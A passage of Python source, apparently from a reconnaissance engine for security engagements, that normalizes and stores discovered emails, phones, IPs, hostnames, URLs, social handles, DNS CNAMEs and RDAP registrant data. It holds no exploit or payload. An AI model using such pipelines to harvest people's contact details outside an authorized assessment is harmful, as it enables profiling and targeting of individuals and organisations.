        if progress_label.endswith(" reduction"):
            return f"{progress_label[:-10]} apply"
        if progress_label.endswith(" resolve"):
            return f"{progress_label[:-8]} apply"
        return f"{progress_label} apply"

    def _derive_merge_progress_label(progress_label: str | None) -> str | None:
        if not progress_label:
            return None
        if progress_label.endswith(" prep"):
            return f"{progress_label[:-5]} merge"
        if progress_label.endswith(" parse"):
            return f"{progress_label[:-6]} merge"
        if progress_label.endswith(" reduction"):
            return f"{progress_label[:-10]} merge"
        if progress_label.endswith(" resolve"):
            return f"{progress_label[:-8]} merge"
        if progress_label.endswith(" apply"):
            return f"{progress_label[:-6]} merge"
        return f"{progress_label} merge"

    def _derive_child_progress_label(
        progress_label: str | None,
        child_stage: str,
    ) -> str | None:
        if not progress_label:
            return None
        base_label = progress_label
        for suffix in (" prep", " parse", " reduction", " resolve", " apply", " merge"):
            if base_label.endswith(suffix):
                base_label = base_label[: -len(suffix)]
                break
        return f"{base_label} {child_stage}"

    def _run_ordered_inprocess_apply_batch(
        items: Sequence[Any],
        worker: Callable[[Any], Any],
        *,
        progress_label: str | None,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
        order_note: str,
    ) -> list[Any]:
        if progress_label and len(items) > 1:
            _log(
                progress_label,
                f"[dim]sequential dispatch x1[/dim]  [dim]{order_note}[/dim]",
            )
        return _run_inprocess_batch(
            items,
            worker,
            max_workers=1,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )

    def _prepare_email_load_reduction_item(
        prepared_email_value: tuple[str, str] | None,
        *,
        already: set[str],
    ) -> str | None:
        if prepared_email_value is None:
            return None
        _raw_email_value, normalized_email = prepared_email_value
        if "@" not in normalized_email or normalized_email in already:
            return None
        return normalized_email

    def _prepare_seed_load_reduction_item(
        prepared_seed_value: tuple[str, str] | None,
        *,
        already: set[str],
    ) -> str | None:
        if prepared_seed_value is None:
            return None
        seed_value, normalized = prepared_seed_value
        if not seed_value or normalized in already:
            return None
        return seed_value

    def _prepare_prioritized_seed_load_reduction_item(
        prepared_prioritized_row: tuple[str, int, str] | None,
        *,
        already: set[str],
    ) -> dict[str, object] | None:
        if prepared_prioritized_row is None:
            return None
        seed_value, seed_depth, normalized = prepared_prioritized_row
        if not seed_value or normalized in already:
            return None
        return {
            "seed_value": seed_value,
            "seed_depth": seed_depth,
            "normalized": normalized,
        }

    def _apply_loaded_seed_value_item(
        item: str | None,
        *,
        loaded_values_out: set[str],
    ) -> str | None:
        if item is None:
            return None
        normalized_value = str(item or "").strip()
        if not normalized_value:
            return None
        loaded_values_out.add(normalized_value)
        return normalized_value

    def _apply_prioritized_seed_load_reduction_item(
        item: dict[str, object] | None,
        *,
        prioritized_out: list[tuple[str, int]],
        seen_normalized_out: set[str],
    ) -> str | None:
        if item is None:
            return None
        seed_value = str(item.get("seed_value") or "").strip()
        seed_depth = int(item.get("seed_depth") or 0)
        normalized = str(item.get("normalized") or "").strip()
        if not seed_value or not normalized or normalized in seen_normalized_out:
            return None
        seen_normalized_out.add(normalized)
        prioritized_out.append((seed_value, seed_depth))
        return seed_value

    def _prepare_social_handle_load_reduction_item(
        handle_set: set[str],
        *,
        already: set[str],
    ) -> set[str]:
        return {
            handle
            for handle in handle_set
            if handle and handle not in already
        }

    def _prepare_social_profile_handle_item(
        handle: str,
    ) -> str | None:
        normalized = str(handle or "").strip().lstrip("@").lower()
        if 3 <= len(normalized) <= 32 and _re.match(r"^[a-zA-Z0-9_.\-]+$", normalized):
            return normalized
        return None

    def _extract_social_profile_entry_handles(
        entry: dict[str, Any],
        *,
        row_source: str,
        max_workers: int = 1,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> set[str]:
        if not isinstance(entry, dict):
            return set()
        source_label = str(entry.get("source") or row_source or "").strip()
        platform = EngagementSynthesisEngine._social_profile_platform_hint(entry)
        if EngagementSynthesisEngine._social_profile_is_company_profile(
            entry,
            source_label=source_label,
            platform=platform,
        ):
            return set()
        prepared_handles = _run_inprocess_batch(
            EngagementSynthesisEngine._social_profile_handles(entry),
            _prepare_social_profile_handle_item,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        found_handles: set[str] = set()
        _run_ordered_inprocess_apply_batch(
            prepared_handles,
            lambda handle: _apply_processed_set_item(
                str(handle) if handle is not None else None,
                processed_set=found_handles,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="social-profile handle order preserved",
        )
        return found_handles

    def _prepare_known_hostname_reduction_item(
        hostname: str | None,
        *,
        existing_seen: set[str],
    ) -> dict[str, object] | None:
        if not hostname:
            return None
        normalized = hostname.lower()
        if normalized in existing_seen:
            return None
        return {
            "hostname": hostname,
            "normalized": normalized,
        }

    def _apply_unique_hostname_hint_item(
        item: str | None,
        *,
        matching_out: list[str],
        seen_out: set[str],
    ) -> str | None:
        normalized = str(item or "").strip().lower()
        if not normalized or normalized in seen_out:
            return None
        seen_out.add(normalized)
        matching_out.append(normalized)
        return normalized

    def _apply_known_hostname_reduction_item(
        item: dict[str, object] | None,
        *,
        discovered_out: list[str],
        seen_out: set[str],
    ) -> str | None:
        if item is None:
            return None
        hostname = str(item["hostname"])
        normalized = str(item["normalized"])
        if normalized in seen_out:
            return None
        seen_out.add(normalized)
        discovered_out.append(hostname)
        return hostname

    def _apply_partitioned_root_domain_item(
        item: tuple[str, bool],
        *,
        pending_domains_out: list[str],
        skipped_domains_out: list[str],
    ) -> str | None:
        root_domain, already_completed = item
        normalized_root_domain = str(root_domain or "").strip()
        if not normalized_root_domain:
            return None
        if bool(already_completed):
            skipped_domains_out.append(normalized_root_domain)
        else:
            pending_domains_out.append(normalized_root_domain)
        return normalized_root_domain

    def _collect_normalized_value_set(
        values: Sequence[str],
        *,
        normalizer: Callable[[str], str],
        max_workers: int,
        progress_label: str | None,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
    ) -> set[str]:
        normalized_values = _run_inprocess_batch(
            list(values),
            lambda value: _prepare_processed_set_item(
                value,
                normalizer=normalizer,
            ),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        collected_values: set[str] = set()
        _run_ordered_inprocess_apply_batch(
            normalized_values,
            lambda item: _apply_processed_set_item(
                item,
                processed_set=collected_values,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="normalized value order preserved",
        )
        return collected_values

    def _prepare_single_text_row_value(row: Any) -> str | None:
        raw_value = row[0] if isinstance(row, (tuple, list)) and row else row
        text_value = str(raw_value or "").strip()
        return text_value or None

    def _collect_text_row_values(
        rows: Sequence[Any],
        *,
        max_workers: int,
        progress_label: str | None,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
    ) -> list[str]:
        prepared_values = _run_inprocess_batch(
            list(rows),
            _prepare_single_text_row_value,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        collected_values: list[str] = []
        _run_ordered_inprocess_apply_batch(
            prepared_values,
            lambda item: _apply_present_batch_item(
                item,
                batch_out=collected_values,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="row value order preserved",
        )
        return collected_values

    def _collect_normalized_text_row_value_set(
        rows: Sequence[Any],
        *,
        normalizer: Callable[[str], str],
        max_workers: int,
        row_progress_label: str | None,
        set_progress_label: str | None,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
    ) -> set[str]:
        return _collect_normalized_value_set(
            _collect_text_row_values(
                rows,
                max_workers=max_workers,
                progress_label=row_progress_label,
                progress_callback=progress_callback,
            ),
            normalizer=normalizer,
            max_workers=max_workers,
            progress_label=set_progress_label,
            progress_callback=progress_callback,
        )

    def _prepare_social_profile_row_item(
        row: Any,
    ) -> tuple[str, str] | None:
        if isinstance(row, (tuple, list)):
            raw_source = row[0] if len(row) > 0 else ""
            raw_profile_data = row[1] if len(row) > 1 else ""
        else:
            raw_source = ""
            raw_profile_data = row
        profile_data = str(raw_profile_data or "")
        if not profile_data.strip():
            return None
        return (str(raw_source or "").strip(), profile_data)

    def _collect_social_profile_row_items(
        rows: Sequence[Any],
        *,
        max_workers: int,
        progress_label: str | None,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
    ) -> list[tuple[str, str]]:
        prepared_items = _run_inprocess_batch(
            list(rows),
            _prepare_social_profile_row_item,
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        collected_items: list[tuple[str, str]] = []
        _run_ordered_inprocess_apply_batch(
            prepared_items,
            lambda item: _apply_present_batch_item(
                item,
                batch_out=collected_items,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="social-profile row order preserved",
        )
        return collected_items

    def _prepare_known_ip_reduction_item(
        ip_value: str | None,
    ) -> str | None:
        return ip_value if ip_value else None

    def _prepare_email_persist_reduction_item(
        prepared_email_value: str | None,
        *,
        existing_lower: set[str],
    ) -> str | None:
        if not prepared_email_value or prepared_email_value in existing_lower:
            return None
        return prepared_email_value

    def _prepare_phone_persist_reduction_item(
        prepared_phone_value: str | None,
        *,
        existing: set[str],
    ) -> str | None:
        if not prepared_phone_value or prepared_phone_value in existing:
            return None
        return prepared_phone_value

    def _prepare_ip_persist_reduction_item(
        prepared_ip_value: tuple[str, str] | None,
        *,
        existing_seed_ips: set[str],
        existing_host_ips: set[str],
    ) -> dict[str, object] | None:
        if prepared_ip_value is None:
            return None
        normalized_ip, seed_type = prepared_ip_value
        if not normalized_ip:
            return None
        insert_seed = normalized_ip not in existing_seed_ips
        insert_host = normalized_ip not in existing_host_ips
        if not insert_seed and not insert_host:
            return None
        return {
            "normalized_ip": normalized_ip,
            "seed_type": seed_type,
            "insert_seed": insert_seed,
            "insert_host": insert_host,
        }

    def _prepare_hostname_persist_reduction_item(
        hostname: str | None,
        *,
        existing_seed_hosts: set[str],
        existing_hosts: set[str],
    ) -> str | None:
        if not hostname:
            return None
        normalized_host = hostname.lower()
        if normalized_host in existing_seed_hosts and normalized_host in existing_hosts:
            return None
        return hostname

    def _prepare_resolved_hostname_item(
        hostname: str | None,
    ) -> dict[str, object] | None:
        normalized_host = str(hostname or "").strip().lower().strip(".")
        if (
            not normalized_host
            or "." not in normalized_host
            or _excluded_host_for_seed_routing(normalized_host)
        ):
            return None
        try:
            resolved_ip = _socket.gethostbyname(normalized_host)
        except (_socket.gaierror, _socket.herror, OSError):
            resolved_ip = "0.0.0.0"
        return {
            "hostname": normalized_host,
            "resolved_ip": resolved_ip,
            "synthetic_ip": _is_placeholder_host_ip(resolved_ip),
        }

    def _prepare_crawl_url_persist_reduction_item(
        prepared_url: tuple[str, str] | None,
        *,
        existing_crawl_urls: set[str],
        existing_url_seeds: set[str],
        source_metadata: dict[str, dict[str, Any]] | None = None,
    ) -> dict[str, object] | None:
        if prepared_url is None:
            return None
        normalized_url, seed_type = prepared_url
        if not normalized_url:
            return None
        metadata = (source_metadata or {}).get(normalized_url, {})
        return {
            "normalized_url": normalized_url,
            "seed_type": seed_type,
            "insert_crawl": normalized_url not in existing_crawl_urls,
            "insert_seed": normalized_url not in existing_url_seeds,
            "metadata": metadata if isinstance(metadata, dict) else {},
        }

    def _prepare_public_profile_url_persist_reduction_item(
        prepared_url: tuple[str, str] | None,
        *,
        existing_url_seeds: set[str],
    ) -> dict[str, object] | None:
        if prepared_url is None:
            return None
        normalized_url, seed_type = prepared_url
        if not normalized_url:
            return None
        return {
            "normalized_url": normalized_url,
            "seed_type": seed_type,
            "insert_seed": normalized_url not in existing_url_seeds,
        }

    def _artifact_source_metadata(raw_metadata_json: str) -> dict[str, Any]:
        try:
            parsed = json.loads(str(raw_metadata_json or "{}"))
        except (TypeError, ValueError):
            return {}
        if not isinstance(parsed, dict):
            return {}
        allowed_keys = {
            "archive_sources",
            "content_disposition",
            "content_type",
            "download_filename",
            "provider_sources",
            "root_domain",
            "discovered_from",
            "source",
            "source_backend",
            "source_provider",
            "source_url",
            "source_seed_url",
            "fixture_provider",
            "hostname",
            "scan_domain",
            "scan_id",
            "scheme",
            "port",
        }
        metadata: dict[str, Any] = {}
        for key in allowed_keys:
            value = parsed.get(key)
            if value in (None, "", [], {}):
                continue
            if isinstance(value, list):
                metadata[key] = [
                    str(item or "").strip()
                    for item in value[:8]
                    if str(item or "").strip()
                ]
            elif isinstance(value, (str, int, float, bool)):
                metadata[key] = value
            else:
                metadata[key] = str(value)
        metadata_aliases = {
            "content_disposition": ("content-disposition", "Content-Disposition"),
            "content_type": ("content-type", "Content-Type", "mime_type", "mimeType"),
            "download_filename": ("filename", "downloaded_filename"),
        }
        for normalized_key, alias_keys in metadata_aliases.items():
            if normalized_key in metadata:
                continue
            for alias_key in alias_keys:
                value = parsed.get(alias_key)
                if value in (None, "", [], {}):
                    continue
                if isinstance(value, (str, int, float, bool)):
                    metadata[normalized_key] = value
                else:
                    metadata[normalized_key] = str(value)
                break
        return metadata

    def _url_seed_source_metadata(raw_metadata_json: str, source_url: str) -> dict[str, Any]:
        metadata = _artifact_source_metadata(raw_metadata_json)
        normalized_source_url = str(source_url or "").strip()
        if normalized_source_url:
            metadata.setdefault("source_url", normalized_source_url)
            metadata.setdefault("source_seed_url", normalized_source_url)
        return metadata

    def _load_url_seed_source_metadata(
        url_seed_batch: Sequence[tuple[str, int]],
    ) -> dict[str, dict[str, Any]]:
        urls = [
            str(url_seed or "").strip()
            for url_seed, _depth in url_seed_batch
            if str(url_seed or "").strip()
        ]
        if not urls:
            return {}
        placeholders = ",".join("?" for _ in urls)
        con = _sq.connect(db_path)
        try:
            try:
                rows = con.execute(
                    f"""
                    SELECT seed_value, metadata_json
                    FROM engagement_seeds
                    WHERE engagement_id=?
                      AND seed_type='url'
                      AND seed_value IN ({placeholders})
                    """,
                    (engagement_id, *urls),
                ).fetchall()
            except _sq.OperationalError:
                return {}
        finally:
            con.close()
        metadata_by_url: dict[str, dict[str, Any]] = {}
        for seed_value, metadata_json in rows:
            source_url = str(seed_value or "").strip()
            metadata = _url_seed_source_metadata(str(metadata_json or "{}"), source_url)
            if source_url and metadata:
                metadata_by_url[_normalize_url_seed_value(source_url)] = metadata
        return metadata_by_url

    def _merge_child_url_metadata(
        target: dict[str, dict[str, Any]],
        child_url: str,
        source_metadata: dict[str, Any],
    ) -> None:
        normalized_child = str(child_url or "").strip()
        if not normalized_child or not source_metadata:
            return
        existing = target.setdefault(normalized_child, {})
        for key, value in source_metadata.items():
            if value in (None, "", [], {}):
                continue
            if key in {"archive_sources", "provider_sources"} and isinstance(value, list):
                merged = [
                    str(item or "").strip()
                    for item in existing.get(key, [])
                    if str(item or "").strip()
                ]
                for raw_item in value:
                    item = str(raw_item or "").strip()
                    if item and item not in merged:
                        merged.append(item)
                if merged:
                    existing[key] = merged[:8]
                continue
            existing.setdefault(key, value)

    def _url_surface_child_metadata(
        prepared_entries: Sequence[dict[str, object]],
        *,
        source_metadata_by_url: dict[str, dict[str, Any]],
        max_workers: int,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> dict[str, dict[str, Any]]:
        child_metadata: dict[str, dict[str, Any]] = {}
        prepared_child_batches = _run_inprocess_batch(
            list(prepared_entries),
            lambda entry: _prepare_url_surface_child_metadata_entry(
                entry,
                source_metadata_by_url=source_metadata_by_url,
            ),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        for child_batch in prepared_child_batches:
            for child_url, metadata in child_batch:
                _merge_child_url_metadata(child_metadata, child_url, metadata)
        return child_metadata

    def _prepare_url_surface_child_metadata_entry(
        entry: dict[str, object],
        *,
        source_metadata_by_url: dict[str, dict[str, Any]],
    ) -> list[tuple[str, dict[str, Any]]]:
        source_url = str(entry.get("source_url") or "").strip()
        source_metadata = source_metadata_by_url.get(_normalize_url_seed_value(source_url), {})
        if not source_metadata:
            return []
        metadata = dict(source_metadata)
        metadata["discovered_from"] = "url_seed_extract"
        metadata["source_url"] = source_url
        mined = cast(dict[str, Any], entry.get("mined") or {})
        pairs: list[tuple[str, dict[str, Any]]] = []
        for raw_child_url in mined.get("crawl_urls", []) or []:
            prepared_child = _prepare_discovered_seed_url(
                str(raw_child_url or ""),
                require_scope=True,
            )
            if prepared_child is None:
                continue
            pairs.append((prepared_child[0], dict(metadata)))
        return pairs

    def _prepare_artifact_classification_reduction_item(
        item: tuple[str, str, str | None, dict[str, Any], str | None],
    ) -> dict[str, object] | None:
        raw_url, discovered_from, seed_type, source_metadata, artifact_type = item
        normalized_url = str(raw_url or "").strip()
        normalized_discovered_from = str(discovered_from or "").strip()
        normalized_seed_type = str(seed_type or "").strip().lower() or None
        normalized_artifact_type = str(artifact_type or "").strip()
        if not normalized_url or not normalized_discovered_from or not normalized_artifact_type:
            return None
        return {
            "raw_url": normalized_url,
            "discovered_from": normalized_discovered_from,
            "seed_type": normalized_seed_type,
            "artifact_type": normalized_artifact_type,
            "metadata": source_metadata if isinstance(source_metadata, dict) else {},
        }

    def _prepare_artifact_source_candidate_item(
        item: tuple[str, tuple[Any, ...]],
    ) -> tuple[str, str, str | None, dict[str, Any]] | None:
        source_name, row = item
        if source_name == "crawl_results":
            raw_url = str(row[0] or "").strip()
            if raw_url:
                raw_metadata = str(row[1] or "{}") if len(row) > 1 else "{}"
                return raw_url, "crawl_results", None, _artifact_source_metadata(raw_metadata)
            return None
        if source_name == "engagement_seed":
            raw_url = str(row[0] or "").strip()
            seed_type = str(row[1] or "").strip().lower() or None
            raw_metadata = str(row[2] or "{}") if len(row) > 2 else "{}"
            if raw_url:
                return raw_url, "engagement_seed", seed_type, _artifact_source_metadata(raw_metadata)
        return None

    def _prepare_artifact_source_reduction_item(
        item: tuple[str, str, str | None, dict[str, Any]] | None,
    ) -> tuple[str, str, str | None, dict[str, Any]] | None:
        if item is None:
            return None
        raw_url, discovered_from, seed_type, source_metadata = item
        normalized_url = str(raw_url or "").strip()
        normalized_discovered_from = str(discovered_from or "").strip()
        normalized_seed_type = str(seed_type or "").strip().lower() or None
        if not normalized_url or not normalized_discovered_from:
            return None
        return (
            normalized_url,
            normalized_discovered_from,
            normalized_seed_type,
            source_metadata if isinstance(source_metadata, dict) else {},
        )

    def _apply_artifact_source_candidate_item(
        item: tuple[str, str, str | None, dict[str, Any]] | None,
        *,
        candidates_out: list[tuple[str, str, str | None, dict[str, Any]]],
    ) -> str | None:
        if item is None:
            return None
        candidates_out.append(item)
        return str(item[0] or "")

    def _apply_artifact_queue_candidate_item(
        item: dict[str, object] | None,
        *,
        queue_candidates_out: list[dict[str, object]],
        seen_urls_out: set[str],
    ) -> str | None:
        if item is None:
            return None
        raw_url = str(item.get("raw_url") or "").strip()
        if not raw_url or raw_url in seen_urls_out:
            return None
        seen_urls_out.add(raw_url)
        queue_candidates_out.append(item)
        return raw_url

    def _partition_root_domains(
        root_domain_values: list[str],
        *,
        completed_domains: set[str],
        max_workers: int,
        progress_label: str | None = None,
        progress_callback: Callable[[str, dict[str, object]], None] | None = None,
    ) -> tuple[list[str], list[str]]:
        if not root_domain_values:
            return [], []
        if progress_label and len(root_domain_values) > 1 and max_workers > 1:
            _log(
                progress_label,
                f"[dim]parallel parse x{min(max_workers, len(root_domain_values))}[/dim]",
            )
        prepared_root_domains = _run_inprocess_batch(
            list(root_domain_values),
            lambda root_domain: (
                root_domain,
                _resume_normalize(root_domain) in completed_domains,
            ),
            max_workers=max_workers,
            progress_label=progress_label,
            progress_callback=progress_callback,
        )
        pending_domains: list[str] = []
        skipped_domains: list[str] = []
        _run_ordered_inprocess_apply_batch(
            prepared_root_domains,
            lambda item: _apply_partitioned_root_domain_item(
                item,
                pending_domains_out=pending_domains,
                skipped_domains_out=skipped_domains,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="root-domain partition order preserved",
        )
        return pending_domains, skipped_domains

    def _prepare_dns_result(
        item: tuple[str, dict[str, Any]],
    ) -> dict[str, object]:
        root_domain = str(item[0] or "").strip()
        result = item[1] or {}
        queried_hosts = [
            str(host or "").strip().lower()
            for host in (result.get("queried_hosts", []) or [])
            if str(host or "").strip()
        ]
        signals = [
            str(signal or "").strip()
            for signal in (result.get("signals", []) or [])
            if str(signal or "").strip()
        ]
        cname_targets = [
            str(target or "").strip().lower()
            for target in (result.get("cname_targets", []) or [])
            if str(target or "").strip()
        ]
        return {
            "root_domain": root_domain,
            "queried_hosts": queried_hosts,
            "signals": signals,
            "cname_targets": cname_targets,
        }

    def _prepare_rdap_result(
        item: tuple[str, dict[str, Any]],
    ) -> dict[str, object]:
        root_domain = str(item[0] or "").strip()
        result = item[1] or {}
        rdap = result.get("rdap") or {}
        registrant_emails = [
            str(email or "").strip()
            for email in (rdap.get("registrant_emails", []) or [])
            if str(email or "").strip()
        ]
        nameservers = [
            str(nameserver or "").strip()
            for nameserver in (rdap.get("related_nameservers", []) or [])
            if str(nameserver or "").strip()
        ]
        return {
            "root_domain": root_domain,
            "has_rdap": bool(rdap),
            "registrant_emails": registrant_emails,
            "registrar": str(rdap.get("registrar", "") or ""),
            "nameservers": nameservers,
        }

    def _prepare_dns_domain_result_entry(
        item: tuple[Any, dict[str, Any]],
    ) -> dict[str, object]:
        handle, prepared_result = item
        queried_hosts = list(prepared_result.get("queried_hosts", []) or [])
        signals = list(prepared_result.get("signals", []) or [])
        cname_targets = list(prepared_result.get("cname_targets", []) or [])
        return {
            "handle": handle,
            "root_domain": str(prepared_result.get("root_domain", "") or ""),
            "queried_hosts": queried_hosts,
            "signals": signals,
            "signal_preview": signals[:8],
            "cname_targets": cname_targets,
            "hosts_queried": len(queried_hosts),
            "output_count_base": len(signals),
        }

    def _prepare_dns_cname_resolution_input_group(
        item: dict[str, object],
    ) -> list[str]:
        return [
            str(normalized_target or "").strip().lower()
            for normalized_target in cast(list[str], item.get("cname_targets") or [])
            if str(normalized_target or "").strip()
        ]

    def _apply_dns_cname_resolution_input_group(
        item: list[str] | None,
        *,
        resolution_inputs_out: list[str],
        seen_resolution_inputs_out: set[str],
        existing_hosts: set[str],
    ) -> int:
        if not item:
            return 0
        added = 0
        for normalized_host in item:
            if (
                not normalized_host
                or normalized_host in existing_hosts
                or normalized_host in seen_resolution_inputs_out
            ):
                continue
            seen_resolution_inputs_out.add(normalized_host)
            resolution_inputs_out.append(normalized_host)
            added += 1
        return added

    def _apply_dns_domain_result_entry(
        item: dict[str, object],
        *,
        con: Any,
        existing_seed_hosts: set[str],
        existing_hosts: set[str],
        resolved_cname_map: dict[str, dict[str, object]],
    ) -> dict[str, object]:
        handle = item["handle"]
        root_domain = str(item["root_domain"])
        queried_hosts = cast(list[str], item["queried_hosts"])
        signals = cast(list[str], item["signals"])
        domain_added = 0
        for normalized_target in cast(list[str], item["cname_targets"]):
            resolved_target = resolved_cname_map.get(
                str(normalized_target or "").strip().lower()
            )
            if _persist_discovered_subdomain_seed(
                con,
                normalized_target,
                discovery="dns_cname",
                existing_seed_hosts=existing_seed_hosts,
                existing_hosts=existing_hosts,
                resolved_ip=(
                    cast(str | None, resolved_target.get("resolved_ip"))
                    if resolved_target is not None
                    else None
                ),
                synthetic_ip=(
                    cast(bool | None, resolved_target.get("synthetic_ip"))
                    if resolved_target is not None
                    else None
                ),
            ):
                domain_added += 1
        # Release the SQLite write lock before the run tracker records
        # progress for this root-domain batch.
        con.commit()
        _log(
            f"{iteration}.G DNS enrichment",
            (
                f"{root_domain}: queried {len(queried_hosts)} host(s), "
                f"+{domain_added} CNAME host(s), "
                f"SaaS signals: {','.join(cast(list[str], item['signal_preview'])) if signals else 'none'}"
            ),
        )
        return {
            "handle": handle,
            "root_domain": root_domain,
            "domain_added": domain_added,
            "hosts_queried": int(item["hosts_queried"]),
            "signals": list(signals),
            "signal_preview": list(cast(list[str], item["signal_preview"])),
            "output_count_base": int(item["output_count_base"]),
        }

    def _prepare_dns_domain_finalize_entry(
        item: dict[str, object],
    ) -> dict[str, object] | None:
        handle = item.get("handle")
        if handle is None:
            return None
        return _prepare_module_seed_run_finalization_entry(
            (
                handle,
                {"metadata": {"iteration": iteration}},
            ),
            base_metadata_value={},
            status="completed",
            output_count=int(item.get("output_count_base") or 0) + int(item.get("domain_added") or 0),
            extra_metadata={
                "iteration": iteration,
                "signals": [
                    str(signal or "").strip()
                    for signal in cast(list[str], item.get("signal_preview") or [])
                    if str(signal or "").strip()
                ],
                "hosts_queried": int(item.get("hosts_queried") or 0),
            },
        )

    def _prepare_dns_domain_summary_item(
        item: dict[str, object],
    ) -> dict[str, object]:
        return {
            "domain_added": int(item.get("domain_added") or 0),
            "hosts_queried": int(item.get("hosts_queried") or 0),
            "signals": [
                str(signal or "").strip()
                for signal in list(item.get("signals") or [])
                if str(signal or "").strip()
            ],
        }

    def _apply_dns_domain_summary_item(
        item: dict[str, object],
        *,
        summary_totals_out: dict[str, int],
        aggregate_signals_out: set[str],
    ) -> int:
        summary_totals_out["domain_added"] += int(item.get("domain_added") or 0)
        summary_totals_out["hosts_queried"] += int(item.get("hosts_queried") or 0)
        aggregate_signals_out.update(cast(list[str], item.get("signals") or []))
        return int(item.get("domain_added") or 0)

    def _prepare_rdap_domain_result_entry(
        item: tuple[Any, dict[str, Any]],
    ) -> dict[str, object]:
        handle, prepared_result = item
        registrant_emails = list(prepared_result.get("registrant_emails", []) or [])
        nameservers = list(prepared_result.get("nameservers", []) or [])
        has_rdap = bool(prepared_result.get("has_rdap"))
        return {
            "handle": handle,
            "root_domain": str(prepared_result.get("root_domain", "") or ""),
            "has_rdap": has_rdap,
            "registrant_emails": registrant_emails,
            "registrar": str(prepared_result.get("registrar", "") or ""),
            "nameservers": nameservers,
            "output_count_base": len(registrant_emails) + len(nameservers),
        }

    def _prepare_wayback_domain_result_entry(
        item: tuple[str, Any, dict[str, Any], list[Any]],
        *,
        wayback_full_value: bool,
    ) -> dict[str, object]:
        root_domain, handle, result, host_candidates = item
        urls = list(result.get("urls", []) or [])
        raw_url_metadata = result.get("url_metadata") or {}
        url_metadata = raw_url_metadata if isinstance(raw_url_metadata, dict) else {}
        unique_hosts = sorted(
            {
                str(host).strip()
                for host in host_candidates
                if isinstance(host, str) and str(host).strip()
            }
        )
        return {
            "root_domain": str(root_domain or ""),
            "handle": handle,
            "urls": urls,
            "url_metadata": url_metadata,
            "url_count": len(urls),
            "unique_hosts": unique_hosts,
            "host_count": len(unique_hosts),
            "mode": "full" if wayback_full_value else "capped",
        }

    def _prepare_wayback_domain_result_input(
        item: tuple[str, Any, dict[str, Any], list[Any]],
    ) -> tuple[str, Any, dict[str, Any], list[Any]]:
        root_domain, handle, result, host_candidates = item
        return (
            str(root_domain or ""),
            handle,
            cast(dict[str, Any], result or {}),
            list(host_candidates or []),
        )

    def _prepare_log_entry(
        item: tuple[str, str],
    ) -> dict[str, str]:
        label, message = item
        return {
            "label": str(label or "").strip(),
            "message": str(message or ""),
        }

    def _emit_prepared_log_entries(
        log_inputs: Sequence[tuple[str, str]],
        *,
        prepare_worker: Callable[[tuple[str, str]], dict[str, str]],
        max_workers: int,
        prep_progress_label: str | None,
        merge_progress_label: str | None,
        progress_callback: Callable[[str, dict[str, object]], None] | None,
        order_note: str,
    ) -> None:
        prepared_log_entries = _run_inprocess_batch(
            list(log_inputs),
            prepare_worker,
            max_workers=max_workers,
            progress_label=prep_progress_label,
            progress_callback=progress_callback,
        )
        _run_ordered_inprocess_apply_batch(
            prepared_log_entries,
            _apply_prepared_log_entry,
            progress_label=merge_progress_label,
            progress_callback=progress_callback,
            order_note=order_note,
        )

    def _prepare_resume_skip_log_entry(
        item: tuple[str, str],
    ) -> dict[str, str]:
        stage_label, root_domain = item
        return _prepare_log_entry(
            (
                f"{str(stage_label or '').strip()} ({str(root_domain or '').strip()})",
                "[dim]resume skip — already completed for this engagement[/dim]",
            )
        )

    def _prepare_domain_dry_run_skip_entry(
        item: tuple[str, str],
    ) -> dict[str, object] | None:
        root_domain, loop_name = item
        return _prepare_one_shot_seed_run_entry(
            seed_value=str(root_domain or "").strip(),
            seed_type="domain",
            loop_name=str(loop_name or "").strip(),
            source="orchestrator",
            start_metadata={"iteration": iteration},
            status="skipped",
            finish_metadata={"iteration": iteration, "mode": "dry_run"},
        )

    def _apply_domain_dry_run_skip_entry(
        item: dict[str, object] | None,
    ) -> str | None:
        return _apply_one_shot_seed_run_entry(item)

    def _prepare_url_dry_run_skip_entry(
        item: tuple[str, int, str],
    ) -> dict[str, object] | None:
        seed_value, seed_depth, loop_name = item
        return _prepare_one_shot_seed_run_entry(
            seed_value=str(seed_value or "").strip(),
            seed_type="url",
            loop_name=str(loop_name or "").strip(),
            source="discovered",
            depth=max(1, int(seed_depth or 0)),
            confidence=0.8,
            start_metadata={"iteration": iteration},
            status="skipped",
            finish_metadata={"iteration": iteration, "mode": "dry_run"},
        )

    def _apply_url_dry_run_skip_entry(
        item: dict[str, object] | None,
    ) -> str | None:
        return _apply_one_shot_seed_run_entry(item)

    def _apply_rdap_domain_result_entry(
        item: dict[str, object],
        *,
        db_path_value: str,
        engagement_id_value: int,
        max_workers_value: int,
    ) -> dict[str, object]:
        rdap_handle = item["handle"]
        root_domain = str(item["root_domain"])
        if bool(item["has_rdap"]):
            reg_emails = cast(list[str], item["registrant_emails"])
            registrar = str(item["registrar"])
            nameservers = cast(list[str], item["nameservers"])
            new_email_count = _persist_new_emails(
                set(reg_emails),  # type: ignore[arg-type]
                max_workers=max_workers_value,
                progress_label=f"{iteration}.H email persist prep",
                progress_callback=_record_batch_progress,
            )
            _log(
                f"{iteration}.H whois/RDAP",
                (
                    f"{root_domain}: registrar={str(registrar)[:40] or '-'}, "
                    f"+{new_email_count} registrant email(s), "
                    f"{len(nameservers)} nameserver(s)"
                ),
